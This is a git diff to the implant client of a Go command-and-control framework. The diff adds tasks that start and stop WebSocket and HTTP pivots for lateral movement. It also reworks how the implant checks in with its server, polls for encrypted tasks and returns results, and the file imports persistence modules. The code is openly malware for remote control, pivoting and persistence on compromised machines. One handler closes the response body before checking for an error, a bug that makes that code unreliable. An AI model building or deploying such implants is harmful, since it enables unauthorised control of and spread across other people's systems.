@@ -3,7 +3,6 @@ package client
 import (
 	"bytes"
 	"crypto/rsa"
-	"crypto/tls"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -58,6 +57,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/admincheck"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/exectools"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/loggedonusers"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/pivot"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/addusertogroup"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/crontab"
@@ -394,6 +394,18 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = enumhandles.GetHandles()
 	case "console-check":
 		result, cmdError = consolecheck.ConsolCheck()
+	case "start-ws-pivot":
+		go pivot.WSPivot(t.Args[0], t.Args[1])
+		result, cmdError = "Started WS Pivot", nil
+	case "start-http-pivot":
+		go pivot.HTTPPivot(t.Args[0], t.Args[1])
+		result, cmdError = "Started HTTP Pivot", nil
+	case "stop-ws-pivot":
+		pivot.StopWSPivot()
+		result, cmdError = "Stopped WS Pivot", nil
+	case "stop-http-pivot":
+		pivot.StopHTTPPivot()
+		result, cmdError = "Stopped HTTP Pivot", nil
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
@@ -472,17 +484,20 @@ func ClientDoCheckInHttps(client *data.Client, endpoint string) error {
 	if err != nil {
 		return err
 	}
+	req.Header.Set("Connection", "keep-alive")
 	req.Header.Add("authorization", ServerSecret)
-	tr := &http.Transport{
+	/*tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
-	c := http.Client{Transport: tr}
-	resp, err := c.Do(req)
+	}*/
+	//c := http.Client{Transport: tr}
+	//resp, err := c.Do(req)
+
+	resp, err := client.HTTPClient.Do(req)
 	if err != nil {
 		return err
 	}
-	defer resp.Body.Close()
 	msg, err := ioutil.ReadAll(resp.Body)
+	resp.Body.Close()
 	if err != nil {
 		return err
 	}
@@ -518,17 +533,19 @@ func ClientHttpsPollHandler(client *data.Client, endpoint string) ([]data.Task, 
 	}
 	req.Header.Add("authorization", ServerSecret)
 	req.Header.Add("id", client.ClientId)
+	req.Header.Set("Connection", "keep-alive")
 	//fmt.Println(client.ClientId)
-	tr := &http.Transport{
+	/*tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	httpClient := http.Client{Transport: tr}
-	resp, err := httpClient.Do(req)
+	*/
+	resp, err := client.HTTPClient.Do(req)
 	if err != nil {
 		return nil, err
 	}
-	defer resp.Body.Close()
 	encryptedTasks, err := ioutil.ReadAll(resp.Body)
+	resp.Body.Close()
 	if err != nil {
 		return nil, err
 	}
@@ -565,17 +582,20 @@ func ClientHttpsSendResultsHandler(client *data.Client, endpoint string, results
 	if err != nil {
 		return err
 	}
+	req.Header.Set("Connection", "keep-alive")
 	req.Header.Add("authorization", ServerSecret)
 	req.Header.Add("id", client.ClientId)
-	tr := &http.Transport{
+	/*tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	c := http.Client{Transport: tr}
-	resp, err := c.Do(req)
+	*/
+	//resp, err := c.Do(req)
+	resp, err := client.HTTPClient.Do(req)
+	resp.Body.Close()
 	if err != nil {
 		return err
 	}
-	defer resp.Body.Close()
 	//msg, err := ioutil.ReadAll(resp.Body)
 	//log.Println(string(msg))
 	return nil
